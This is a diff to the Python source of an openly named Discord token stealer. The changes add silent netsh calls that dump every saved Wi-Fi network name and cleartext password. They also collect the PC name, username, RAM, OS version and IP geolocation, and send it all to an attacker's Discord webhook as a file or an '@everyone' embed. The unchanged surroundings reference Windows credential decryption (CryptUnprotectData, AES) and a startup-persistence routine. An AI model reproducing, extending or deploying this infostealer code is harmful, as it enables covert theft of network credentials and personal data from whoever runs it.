@@ -2,15 +2,13 @@ import requests
 import base64
 import json
 import re
-import socket
 import os
 import threading
 import shutil
-import psutil
 import sys
 import time
 import ctypes
-import platform
+import subprocess
 
 from Cryptodome.Cipher import AES
 from win32crypt import CryptUnprotectData
@@ -18,9 +16,32 @@ from stuff.msgbox import *
 from blahlivmata import hex
 from conf import *
 
-def sysinfo(webhook):
-    ver = platform.version().split('.')[2] 
-    plat = platform.system() + " " + '10' if int(ver) < 22000 else platform.system() + " " + '11'
+def getwifipassword(network):
+    wifiinfo = subprocess.run(["netsh", "wlan", "show", "profile", f"name=\"{network}\"", "key=clear"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.splitlines()
+    
+    for line in wifiinfo:
+        if 'Key Content' in line:
+            wifipsw = line.split(':')[1][1:]
+            return wifipsw
+
+
+def getwifiprofiles():
+    wifi_profiles = []
+    wifi_P = []
+    WProfiles = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.splitlines()
+    
+    for wifiprof in WProfiles:
+        if 'All User Profile' in wifiprof:
+            wifipf = wifiprof.split(':')[1][1:]
+            wifi_P.append(wifipf)
+    for wifiprofile in wifi_P:
+        wifipassword = getwifipassword(wifiprofile)
+        wifi_profiles.append([wifiprofile, wifipassword])
+    
+    return wifi_profiles
+    
+
+def sysinfo(webhook: str):
     try:
         ip = requests.get('https://ipinfo.io/json')
         iplog = ip.json()
@@ -44,15 +65,25 @@ def sysinfo(webhook):
         postal = 'N/A'
         timezone = 'N/A'
 
-    pcname = socket.gethostname()
+    pcname = os.getenv("COMPUTERNAME")
     username = os.getenv("USERNAME")
     
+    ram = subprocess.check_output("powershell -NoProfile -Command (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory", text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    plat = subprocess.check_output("powershell (Get-CimInstance Win32_OperatingSystem).Caption", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+
+    wifilist = getwifiprofiles()
+
+    if isinstance(webhook, bytes):
+        webhook = webhook.decode("utf-8")
+
     tmp = os.getenv('temp')
     tmpfile = f'{tmp}\\sysinf.txt'
-    with open(tmpfile, 'w', encoding='utf-8') as f:
+    if "discord.com/api/webhooks" in webhook:
+
+        with open(tmpfile, 'w', encoding='utf-8') as f:
             f.write(f'========PC Info========\n')
             f.write(f'PC Name: {pcname}\n')
-            f.write(f'RAM: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB\n')
+            f.write(f'RAM: {round(int(ram) / (1024 ** 3), 2)} GB\n')
             f.write(f'OS: {plat}\n')
             f.write(f'Username: {username}\n')
             f.write(f'========IP Info========\n')
@@ -62,28 +93,57 @@ def sysinfo(webhook):
             f.write(f'Coordinates: {loc}\n')
             f.write(f'Organization: {org}\n')
             f.write(f'Postal: {postal}\n')
-    with open(tmpfile, "rb") as f:
-        files = {"file": (tmpfile, f)}
-        r = requests.post(webhook, files=files)
-        if r.status_code in [200, 201, 204]:
-            print('successfully sent os info')            
-        else:
-            payload = {
-                "content": "||@everyone||",
-                "embeds": [
-                    {
-                        "color": 3646683, 
-                        "fields": [
-                            {"name": "🖥️ PC Name", "value": f"`{pcname}`"},
-                            {"name": "🌐 IP Info", "value": f"\n`IP Address: {ipadd}`\n`Hostname: {hostname}`\n`Location: {city}, {region}, {country}`\n`Coordinates: {loc}`\n`Organization: {org}`\n`Postal: {postal}`\n`Timezone: {timezone}`"},
-                            {"name": "🐏 RAM", "value": f"`{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB`"},
-                            {"name": "💻 OS", "value": f"`{plat}`"},
-                            {"name": "👤 User", "value": f"`{username}`"}],
-                        "footer": {"text": "https://github.com/xvhjs2/Discord-Token-Stealer"}
-                    }
+            f.write(f'========Wi-Fi========\n')
+
+            for wifi, psw in wifilist:
+                f.write(f'{wifi}: {psw}\n')
+        with open(tmpfile, "rb") as f:
+            files = {"file": (tmpfile, f)}
+            r = requests.post(webhook, files=files)
+            if r.status_code in [200, 201, 204]:
+                print('successfully printed sysinfo to webhook')
+            else:
+                payload = {
+                    "content": "||@everyone||",
+                    "embeds": [
+                        {
+                            "color": 3646683,
+                            "fields": [
+                                {"name": "🖥️ PC Name", "value": f"`{pcname}`"},
+                                {"name": "🌐 IP Info", "value": f"\n`IP Address: {ipadd}`\n`Hostname: {hostname}`\n`Location: {city}, {region}, {country}`\n`Coordinates: {loc}`\n`Organization: {org}`\n`Postal: {postal}`\n`Timezone: {timezone}`"},
+                                {"name": "🐏 RAM", "value": f"`{round(int(ram) / (1024 ** 3), 2)} GB`"},
+                                {"name": "💻 OS", "value": f"`{plat}`"},
+                                {"name": "👤 User", "value": f"`{username}`"},
+                                *[{"name": f"📶 Wi-FI Network #{i}", "value": f"`{wifi}: {psw}`"} for i, wifi, psw in enumerate(wifilist)]
+                            ],
+                            "footer": {"text": "https://github.com/xvhjs2/Discord-Token-Stealer"}
+                        }
+                    ],
+                    "username": "TS | System Info"
+                }
+                r = requests.post(webhook, json=payload)
+    else:
+        payload = {
+        "content": "||@everyone||",
+        "embeds": [
+            {
+                "color": 3646683,
+                "fields": [
+                    {"name": "🖥️ PC Name", "value": f"`{pcname}`"},
+                    {"name": "🌐 IP Info", "value": f"\n`IP Address: {ipadd}`\n`Hostname: {hostname}`\n`Location: {city}, {region}, {country}`\n`Coordinates: {loc}`\n`Organization: {org}`\n`Postal: {postal}`\n`Timezone: {timezone}`"},
+                    {"name": "🐏 RAM", "value": f"`{round(int(ram) / (1024 ** 3), 2)} GB`"},
+                    {"name": "💻 OS", "value": f"`{plat}`"},
+                    {"name": "👤 User", "value": f"`{username}`"},
+                    *[{"name": f"📶 Wi-FI Network #{i + 1}", "value": f"`{wifi}: {psw}`"} for i, (wifi, psw) in enumerate(wifilist)]
                 ],
-                "username": "TS | System Info"}
-            r = requests.post(webhook, json=payload)
+                "footer": {"text": "https://github.com/xvhjs2/Discord-Token-Stealer"}
+            }
+        ],
+        "username": "TS | System Info"
+    }
+        r = requests.post(webhook, json=payload)
+
+
 
 def add_to_startup():
     try:
@@ -496,7 +556,4 @@ def main():
         
 
 main()
-
-
-
 
